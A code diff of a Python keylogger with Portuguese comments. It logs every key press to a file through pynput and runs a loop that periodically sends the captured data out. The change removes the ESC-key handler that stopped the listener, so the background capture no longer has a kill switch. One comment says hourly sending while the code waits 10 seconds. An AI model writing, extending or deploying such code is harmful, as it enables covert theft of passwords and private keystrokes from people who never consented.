@@ -53,11 +53,6 @@ def on_press(key):
         with open(log_file, "a") as log:
             log.write(f'[{key}]')
 
-def on_release(key):
-    """Função chamada quando uma tecla é liberada"""
-    if key == Key.esc:  # Se pressionar ESC, interrompe o listener
-        return False
-
 def iniciar_envio_periodico():
     """Função para enviar os dados a cada 1 hora"""
     while True:
@@ -66,7 +61,7 @@ def iniciar_envio_periodico():
         time.sleep(10)  # Espera 1 hora (3600 segundos)
 
 # Iniciar o listener para capturar as teclas pressionadas em segundo plano
-listener = Listener(on_press=on_press, on_release=on_release)
+listener = Listener(on_press=on_press)
 listener.start()
 
 # Iniciar o envio periódico de dados de hora em hora
